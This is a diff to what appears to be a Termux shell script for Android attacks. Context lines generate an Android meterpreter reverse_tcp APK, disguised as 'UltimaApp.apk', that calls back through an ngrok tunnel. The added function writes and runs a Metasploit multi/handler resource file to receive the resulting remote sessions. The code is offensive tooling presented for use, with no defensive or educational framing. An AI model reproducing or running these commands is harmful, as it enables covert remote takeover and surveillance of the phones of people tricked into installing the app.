@@ -99,6 +99,30 @@ read -p "puerto: " puerto
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
 fi
 }
+function sess4 {
+if [ "$1" = "-u" ];then
+msfconsole -q -r $PREFIX/lib/configuration-old
+exit
+fi
+cd
+cd $PREFIX/lib
+rm -Rf configuration-old
+mv configuration-act configuration-old
+cd
+clear
+read -p "HOST= " host12
+read -p "PORT= " port12
+echo "
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST $host12
+set LPORT $port12
+exploit
+" > $PREFIX/lib/configuration-act
+cd
+clear
+msfconsole -q -r $PREFIX/lib/configuration-act
+}
 function sess5 {
 cd
 rm -Rf .dcof
